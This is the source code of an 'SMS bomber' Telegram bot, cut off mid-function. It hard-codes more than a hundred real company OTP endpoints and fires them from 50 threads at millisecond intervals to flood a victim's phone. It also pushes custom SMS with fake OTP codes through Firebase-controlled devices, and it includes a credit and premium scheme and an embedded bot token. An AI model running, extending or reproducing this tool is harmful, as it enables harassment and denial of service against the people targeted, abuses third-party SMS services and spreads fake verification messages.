#!/usr/bin/env python3
# BOMBER BOT - FAST + CRASH-PROOF
# By Warrior X Technical White Hat

import asyncio
import json
import os
import random
import threading
import time
import datetime
import logging
import re
import sqlite3
from concurrent.futures import ThreadPoolExecutor

import requests
from requests.adapters import HTTPAdapter
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.error import RetryAfter, TelegramError
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    ContextTypes, filters, CallbackQueryHandler
)

# ===================== LOGGING =====================
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
    handlers=[logging.FileHandler("bot.log"), logging.StreamHandler()]
)
log = logging.getLogger("bomber")

# ===================== CONFIG =====================
BOT_TOKEN = "8842615934:AAHJwUGHomdRepfUdyAm_i2Wlx3czsNpPts"
OWNER_ID = 8490612097
ADMIN_IDS = [8864524240, 5887312294]

SUPPORT_USERNAME = "@RealZeroXSupport"
SUPPORT_LINK = "https://t.me/RealZeroXSupport"
CHANNEL_USERNAME = "@ExploitLabX"
CHANNEL_LINK = "https://t.me/ExploitLabX"

DEFAULT_COUNTRY_CODE = "91"

# ⚡ MAX SPEED + SAFE LIMITS
THREAD_COUNT = 50              # 50 threads per bombing
RANDOM_DELAY = 0.01            # 10ms between random API calls
CUSTOM_DELAY = 0.005           # 5ms between custom messages
STATUS_UPDATE_INTERVAL = 1     # Progress update every 1 sec
AUTO_REFRESH_SEC = 180
MAX_CONCURRENT_HANDLERS = 100  # Max parallel user actions
MAX_GLOBAL_WORKERS = 200       # Max threads across all bombings

# ===================== APIs =====================
APIS = [
  {"name": "Agrevolution", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Breeze", "url": "https://api.breeze.in/session/start", "method": "POST", "headers": {"Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8"}},
  {"name": "Jockey", "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "PW Live", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=2", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "KPN Fresh", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3", "method": "POST", "headers": {"x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "Content-Type": "application/json; charset=UTF-8"}},
  {"name": "Aditya Birla", "url": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "GoPaySense", "url": "https://api.gopaysense.com/users/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "BankOpen", "url": "https://v2-api.bankopen.co/users/register/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Tata Capital", "url": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "TradeIndia", "url": "https://apis.tradeindia.com/app_login_api/login_app", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Orange Health", "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Jobhai", "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}},
  {"name": "AstroSage", "url": "https://varta.astrosage.com/sdk/registerAS", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Spinny", "url": "https://api.spinny.com/api/c/user/otp-request/v3/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Dream11", "url": "https://www.dream11.com/auth/passwordless/init", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "CityMall", "url": "https://citymall.live/api/cl-user/auth/get-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Bella Vita", "url": "https://api.codfirm.in/api/customers/login/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Oyo", "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en", "method": "POST", "headers": {"Content-Type": "text/plain;charset=UTF-8"}},
  {"name": "Myma", "url": "https://portal.myma.in/custom-api/auth/generateotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Freedo", "url": "https://api.freedo.rentals/customer/sendOtpForSignUp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Licious", "url": "https://www.licious.in/api/login/signup", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Bisleri", "url": "https://apis.bisleri.com/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Evital", "url": "https://www.evitalrx.in:4000/v3/login/signup_sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "QuickRide", "url": "https://pwa.getquickride.com/rideMgmt/probableuser/create/new", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Kwikfix", "url": "https://admin.kwikfixauto.in/api/auth/signupotp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Brevistay", "url": "https://www.brevistay.com/cst/app-api/login", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Hourly Rooms", "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Pagarbook", "url": "https://api.pagarbook.com/api/v5/auth/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Vahak", "url": "https://api.vahak.in/v1/u/o_w", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Redcliffe", "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Ixigo", "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Testbook", "url": "https://api.testbook.com/api/v2/mobile/signup", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Medibuddy", "url": "https://loginprod.medibuddy.in/unified-login/user/register", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Beyoung", "url": "https://www.beyoung.in/api/sendOtp.json", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}},
  {"name": "Wrogn", "url": "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Medkart", "url": "https://app.medkart.in/api/v1/auth/requestOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Coverfox", "url": "https://www.coverfox.com/otp/send/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "GoMechanic", "url": "https://gomechanic.app/api/v2/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Lovelocal", "url": "https://homedeliverybackend.mpaani.com/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Udaan", "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Xylem", "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "NoBroker V1", "url": "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "WoodenStreet", "url": "https://api.woodenstreet.com/api/v1/register", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Foxy", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "PharmEasy", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Wakefit", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Stratzy", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Eka Care", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "NewMe", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Univest", "url": "https://api.univest.in/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "CaratLane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "BikeFixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "WellAcademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "DealShare", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Housing.com", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "A23 Games", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Spencer's", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "PayMe India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Shopper's Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Hyuga Auth", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Lifestyle", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "WorkIndia", "url": "https://api.workindia.in/api/candidate/profile/login/verify-number/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Vyapar", "url": "https://vyaparapp.in/api/ftu/v3/send/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "TooTou", "url": "https://tootoo.in/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "ConfirmTkt", "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Nuvama", "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Mpokket", "url": "https://api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Flipkart Signup", "url": "https://www.flipkart.com/api/6/user/signup/status", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Practo", "url": "https://accounts.practo.com/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Ajio", "url": "https://www.ajio.com/api/auth/signupSendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "AltBalaji", "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Grab", "url": "https://api.grab.com/grabid/v1/phone/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Delhivery", "url": "https://direct.delhivery.com/delhiverydirect/order/generate-otp", "method": "GET", "headers": {}},
  {"name": "ConfirmTkt Reg", "url": "https://securedapi.confirmtkt.com/api/platform/register", "method": "GET", "headers": {}},
  {"name": "Goibibo", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "MakeMyTrip", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}}
]

# ===================== SAFE GLOBALS =====================
_user_semaphore = asyncio.Semaphore(MAX_CONCURRENT_HANDLERS)
_global_executor = ThreadPoolExecutor(max_workers=MAX_GLOBAL_WORKERS)
bombing_active = {}
bombing_threads = {}
request_counts = {}
active_bombings_detail = {}
counter_lock = threading.Lock()

# Firebase circuit breaker
_fb_failures = {}
_fb_lock = threading.Lock()

# Force-join cache
_join_cache = {}
_join_lock = threading.Lock()

# ===================== LOGGING HELPERS =====================
def safe_log(msg):
    try: log.info(msg)
    except Exception: pass

# ===================== DB (WAL MODE) =====================
DB_PATH = "bomber.db"

def db():
    conn = sqlite3.connect(
        DB_PATH, check_same_thread=False, timeout=30.0, isolation_level=None
    )
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA busy_timeout=30000")
    conn.execute("PRAGMA cache_size=10000")
    return conn

def init_db():
    conn = db(); c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
        free_credits INTEGER DEFAULT 3, premium_credits INTEGER DEFAULT 0,
        is_premium INTEGER DEFAULT 0, premium_type TEXT, access_expires_at REAL DEFAULT 0,
        daily_random_bombing INTEGER DEFAULT 0, daily_custom_bombing INTEGER DEFAULT 0,
        daily_sms_used INTEGER DEFAULT 0, last_reset_date TEXT,
        referrer_id INTEGER, referral_count INTEGER DEFAULT 0,
        joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS banned_users (user_id INTEGER PRIMARY KEY)''')
    c.execute('''CREATE TABLE IF NOT EXISTS protected_numbers (number TEXT PRIMARY KEY)''')
    c.execute('''CREATE TABLE IF NOT EXISTS blacklist (number TEXT PRIMARY KEY)''')
    c.execute('''CREATE TABLE IF NOT EXISTS force_channels (id TEXT PRIMARY KEY, label TEXT, url TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS firebases (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT UNIQUE, tag TEXT, added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS activity_history (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, action TEXT, details TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    defaults = [
        ("free_random_bombing", "9000"), ("premium_random_bombing", "19000"),
        ("free_custom_bombing", "3"), ("premium_custom_bombing", "15"),
        ("free_daily_sms", "800"), ("premium_daily_sms", "5000"),
        ("free_daily_credits", "3"), ("maintenance", "0"),
    ]
    for k, v in defaults:
        c.execute("INSERT OR IGNORE INTO config (key, value) VALUES (?, ?)", (k, v))
    conn.commit(); conn.close()

init_db()

# ===================== DB HELPERS =====================
def get_config(key, default="0"):
    conn = db(); c = conn.cursor()
    c.execute("SELECT value FROM config WHERE key = ?", (key,))
    r = c.fetchone(); conn.close()
    return r[0] if r else default

def set_config(key, value):
    conn = db(); c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO config (key, value) VALUES (?, ?)", (key, str(value)))
    conn.commit(); conn.close()

def get_user(uid):
    conn = db(); c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (uid,))
    row = c.fetchone(); conn.close()
    if not row: return None
    keys = ["user_id","username","first_name","free_credits","premium_credits",
            "is_premium","premium_type","access_expires_at","daily_random_bombing",
            "daily_custom_bombing","daily_sms_used","last_reset_date",
            "referrer_id","referral_count","joined_at"]
    return dict(zip(keys, row))

def create_user(uid, username="", first_name="", referrer_id=None):
    conn = db(); c = conn.cursor()
    today = datetime.date.today().isoformat()
    c.execute("""INSERT OR IGNORE INTO users 
        (user_id, username, first_name, free_credits, last_reset_date, referrer_id)
        VALUES (?, ?, ?, ?, ?, ?)""",
        (uid, username, first_name, int(get_config("free_daily_credits", "3")), today, referrer_id))
    conn.commit(); conn.close()

def update_user(uid, **fields):
    if not fields: return
    conn = db(); c = conn.cursor()
    keys = ", ".join(f"{k} = ?" for k in fields)
    values = list(fields.values()) + [uid]
    c.execute(f"UPDATE users SET {keys} WHERE user_id = ?", values)
    conn.commit(); conn.close()

def is_banned(uid):
    conn = db(); c = conn.cursor()
    c.execute("SELECT 1 FROM banned_users WHERE user_id = ?", (uid,))
    r = c.fetchone(); conn.close()
    return r is not None

def is_protected(num):
    conn = db(); c = conn.cursor()
    c.execute("SELECT 1 FROM protected_numbers WHERE number = ?", (num,))
    r = c.fetchone(); conn.close()
    return r is not None

def is_blacklisted(num):
    conn = db(); c = conn.cursor()
    c.execute("SELECT 1 FROM blacklist WHERE number = ?", (num,))
    r = c.fetchone(); conn.close()
    return r is not None

def is_admin(uid): return uid in ADMIN_IDS
def is_owner(uid): return uid == OWNER_ID
def has_admin_access(uid): return uid == OWNER_ID or uid in ADMIN_IDS

def log_activity(uid, action, details=""):
    conn = db(); c = conn.cursor()
    c.execute("INSERT INTO activity_history (user_id, action, details) VALUES (?, ?, ?)",
              (uid, action, details))
    conn.commit(); conn.close()

def get_activity(uid, limit=10):
    conn = db(); c = conn.cursor()
    c.execute("SELECT action, details, created_at FROM activity_history WHERE user_id = ? ORDER BY id DESC LIMIT ?",
              (uid, limit))
    rows = c.fetchall(); conn.close()
    return rows

def check_daily_reset(uid):
    u = get_user(uid)
    if not u: return
    today = datetime.date.today().isoformat()
    if u["last_reset_date"] != today:
        update_user(uid,
            free_credits=int(get_config("free_daily_credits", "3")),
            daily_random_bombing=0, daily_custom_bombing=0,
            daily_sms_used=0, last_reset_date=today)

def get_remaining(uid, kind):
    u = get_user(uid)
    if not u: return 0
    if has_admin_access(uid): return 999999
    if u["is_premium"]:
        limit = int(get_config(f"premium_{kind}_bombing", "15"))
    else:
        limit = int(get_config(f"free_{kind}_bombing", "3"))
    used = u["daily_random_bombing"] if kind == "random" else u["daily_custom_bombing"]
    return max(0, limit - used)

def get_firebases():
    conn = db(); c = conn.cursor()
    c.execute("SELECT url, tag FROM firebases")
    rows = c.fetchall(); conn.close()
    return [{"url": r[0], "tag": r[1]} for r in rows]

def get_force_channels():
    conn = db(); c = conn.cursor()
    c.execute("SELECT id, label, url FROM force_channels")
    rows = c.fetchall(); conn.close()
    return [{"id": r[0], "label": r[1], "url": r[2]} for r in rows]

# ===================== SESSION (POOLED) =====================
_tls = threading.local()

def get_session():
    if not hasattr(_tls, "session"):
        s = requests.Session()
        adapter = HTTPAdapter(
            pool_connections=50, pool_maxsize=50,
            max_retries=1, pool_block=False
        )
        s.mount("http://", adapter); s.mount("https://", adapter)
        s.headers.update({
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
        })
        _tls.session = s
    return _tls.session

# ===================== RANDOM API WORKER =====================
def _build_payload(url, phone, cc):
    u = (url or "").lower()
    if "khatabook" in u: return {"country_code": f"+{cc}", "phone": phone, "app_signature": "Jc/Zu7qNqQ2"}
    if "agrevolution" in u: return {"mobile_number": phone, "client_id": "kisan-app"}
    if "penpencil" in u or "xylem" in u: return {"mobile": phone, "organizationId": "5eb393ee95fab7468a79d189"}
    if "nuvama" in u: return {"contactInfo": phone, "mode": "SMS"}
    if "jockey" in u: return {"mobile": phone, "country_code": f"+{cc}"}
    if "breeze" in u:
        return {"phoneNumber": phone, "authVerificationType": "otp",
                "device": {"id": "A1pKVEDhlv66KLtoYsml3", "platform": "Chrome", "type": "Desktop"},
                "countryCode": f"+{cc}"}
    return {"phone": phone, "mobile": phone, "phoneNumber": phone, "mobileNumber": phone,
            "contactNumber": phone, "country_code": cc, "countryCode": cc}

def call_api(api, phone, cc="91"):
    try:
        url = api["url"]
        method = api.get("method", "POST").upper()
        headers = dict(api.get("headers", {}))
        payload = _build_payload(url, phone, cc)
        s = get_session()
        ct = headers.get("Content-Type", "").lower()
        if method == "GET":
            r = s.get(url, headers=headers, params=payload, timeout=5)
        elif "json" in ct:
            r = s.post(url, headers=headers, json=payload, timeout=5)
        else:
            r = s.post(url, headers=headers, data=payload, timeout=5)
        return r.status_code in (200, 201, 202, 204)
    except Exception:
        return False

def random_otp_worker(uid, target, cc="91"):
    avail = list(range(len(APIS)))
    while bombing_active.get(uid):
        if not avail: avail = list(range(len(APIS)))
        idx = random.choice(avail)
        ok = call_api(APIS[idx], target, cc)
        with counter_lock:
            request_counts[uid] = request_counts.get(uid, 0) + 1
        if uid in active_bombings_detail:
            active_bombings_detail[uid]["requests"] = request_counts.get(uid, 0)
        if not ok and idx in avail:
            avail.remove(idx)
        time.sleep(RANDOM_DELAY)

# ===================== FIREBASE WORKER (FAST) =====================
def is_fb_alive(tag):
    with _fb_lock:
        f, t = _fb_failures.get(tag, (0, 0))
        if f >= 5 and time.time() - t < 300: return False
        return True

def mark_fb_failure(tag):
    with _fb_lock:
        f, _ = _fb_failures.get(tag, (0, 0))
        _fb_failures[tag] = (f + 1, time.time())

def mark_fb_success(tag):
    with _fb_lock:
        _fb_failures.pop(tag, None)

def firebase_custom_worker(uid, target, message, max_count):
    firebases = get_firebases()
    if not firebases: return
    
    s = get_session()
    sent = [0]
    sent_lock = threading.Lock()
    
    while bombing_active.get(uid) and sent[0] < max_count:
        for fb in firebases:
            if not bombing_active.get(uid): break
            if sent[0] >= max_count: break
            if not is_fb_alive(fb["tag"]): continue
            
            fb_url = fb["url"].rstrip("/")
            try:
                r = s.get(f"{fb_url}/clients.json", timeout=3)
                if r.status_code != 200:
                    mark_fb_failure(fb["tag"]); continue
                clients = r.json()
                if not clients or not isinstance(clients, dict): continue
                mark_fb_success(fb["tag"])
            except Exception:
                mark_fb_failure(fb["tag"]); continue
            
            online_devs = [d for d, i in clients.items()
                           if isinstance(i, dict) and i.get("status") is True]
            if not online_devs: continue
            
            for dev_id in online_devs:
                if not bombing_active.get(uid): break
                if sent[0] >= max_count: break
                
                msg = message
                if "{otp}" in msg:
                    otp = str(random.randint(100000, 999999))
                    msg = msg.replace("{otp}", otp)
                
                payload = {"sim": 1, "to": target, "message": msg, "isSended": False}
                try:
                    s.put(f"{fb_url}/clients/{dev_id}/webhookEvent/sendSms.json",
                          json=payload, timeout=2)
                    with sent_lock:
                        sent[0] += 1
                    with counter_lock:
                        request_counts[uid] = request_counts.get(uid, 0) + 1
                    if uid in active_bombings_detail:
                        active_bombings_detail[uid]["requests"] = request_counts.get(uid, 0)
                except Exception:
                    pass
                
                time.sleep(CUSTOM_DELAY)

# ===================== SAFE SEND =====================
async def safe_send(bot, chat_id, text, **kwargs):
    try:
        return await bot.send_message(chat_id=chat_id, text=text, **kwargs)
    except RetryAfter as e:
        await asyncio.sleep(e.retry_after + 1)
        try: return await bot.send_message(chat_id=chat_id, text=text, **kwargs)
        except Exception: return None
    except TelegramError: return None
    except Exception: return None

# ===================== BOMBING STARTER =====================
async def start_bombing(uid, target, context, mode):
    chat_id = uid
    
    if not has_admin_access(uid):
        rem = get_remaining(uid, mode)
        if rem <= 0:
            await safe_send(context.bot, chat_id,
                f"⚙️ *DAILY LIMIT REACHED*\n\n_{mode} limit over_",
                parse_mode="Markdown")
            return
        max_count = rem
    else:
        max_count = 999999
    
    if mode == "custom" and not get_firebases():
        await safe_send(context.bot, chat_id, "⚠️ *No Firebase configured*",
                        parse_mode="Markdown")
        return
    
    request_counts[uid] = 0
    bombing_active[uid] = True
    u = get_user(uid) or {}
    active_bombings_detail[uid] = {
        "username": u.get("username") or "",
        "target": target, "started": time.time(),
        "requests": 0, "mode": mode, "max": max_count,
    }
    
    stop_kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 STOP", callback_data="bomb:stop",
                              api_kwargs={"style": "danger"})]
    ])
    
    try:
        progress_msg = await context.bot.send_message(
            chat_id,
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"   💣 CUSTOM SMS BOMBER\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📱 +91{target}\n\n"
            f"░░░░░░░░░░░░░░░░░░░ 0%\n\n"
            f"🟢 Status: Active\n"
            f"📨 Sent: 0 / {max_count}\n"
            f"⚡ Speed: Fast Mode\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            reply_markup=stop_kb, parse_mode="Markdown")
    except Exception:
        return
    
    # Submit tasks to global thread pool (bounded)
    if mode == "random":
        for _ in range(THREAD_COUNT):
            _global_executor.submit(random_otp_worker, uid, target)
    else:
        message = context.user_data.get("custom_message", "Your code is {otp}")
        for _ in range(THREAD_COUNT):
            _global_executor.submit(firebase_custom_worker, uid, target, message, max_count)
    
    bombing_threads[str(uid)] = []
    
    # Progress updater
    try:
        while bombing_active.get(uid):
            await asyncio.sleep(STATUS_UPDATE_INTERVAL)
            cur = request_counts.get(uid, 0)
            pct = min(int((cur / max_count) * 100), 100) if max_count else 0
            filled = int(pct / 5)
            bar = "█" * filled + "░" * (20 - filled)
            
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id, message_id=progress_msg.message_id,
                    text=(
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"   💣 CUSTOM SMS BOMBER\n"
